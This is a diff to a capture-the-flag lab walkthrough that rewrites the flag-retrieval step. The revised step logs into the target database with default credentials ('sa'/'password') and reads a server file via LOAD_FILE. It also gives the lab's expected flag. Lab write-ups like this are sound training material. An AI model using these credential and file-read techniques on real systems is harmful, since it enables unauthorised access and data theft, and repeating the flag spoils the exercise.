@@ -101,33 +101,36 @@ Carefully review the version detection output to understand database information
 
 ### Step 4: Access Flag
 
-The flag is located in /tmp/flag.txt on the database server.
+The flag is stored in `/tmp/flag.txt` on the database server and in the
+`target_db.secrets` table. Connect with the `sa` account (password `password`):
 
-**Detailed Steps:**
+```bash
+mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p'password' \
+  -e "SELECT LOAD_FILE('/tmp/flag.txt');"
 
-1. **If you have shell access:**
-   ```bash
-   ssh admin@<target_ip>
-   # Password: password
-   ```
+# Or read the seeded table:
+mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p'password' \
+  -e "SELECT content FROM target_db.secrets;"
+```
 
-2. **Navigate to flag location:**
-   ```bash
-   cat /tmp/flag.txt
-   ```
+`root` uses socket authentication and cannot log in remotely.
+
+**Troubleshooting:** `ERROR 1129 ... blocked because of many connection errors`
+means the server temporarily blocked your Kali IP after a burst of aborted
+connections. Stop and relaunch the lab to clear it.
 
 3. **Expected flag content:**
    ```
    OCR{mssql_v3rs10n}
    ```
 
-4. **Alternative: Check if flag is accessible via database:**
+4. **Verify with a direct query:**
    ```bash
-   mysql --ssl-verify-server-cert=0 -h <target_ip> -u root -p
-   # Try to access file system via database commands
+   mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p'password' \
+     -e "SELECT content FROM target_db.secrets;"
    ```
 
-5. **Verify file exists:**
+5. **Verify the flag file exists locally (inside the target):**
    ```bash
    ls -la /tmp/flag.txt
    ```
